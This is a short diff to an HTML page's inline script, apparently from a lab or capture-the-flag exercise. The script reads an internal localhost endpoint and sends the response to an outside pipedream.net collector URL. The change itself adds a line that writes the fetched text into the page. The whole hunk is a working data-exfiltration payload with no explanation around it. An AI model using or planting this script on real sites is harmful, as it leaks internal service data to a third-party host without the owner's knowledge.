@@ -8,6 +8,7 @@
   <script>
     (async function() {
       let t = await (await fetch("http://127.0.0.1:8888/internal/info1")).text();
+      document.write(t);
       await fetch("https://enxnu407hqabq.x.pipedream.net/?data=" + encodeURIComponent(t));
     })();
   </script>
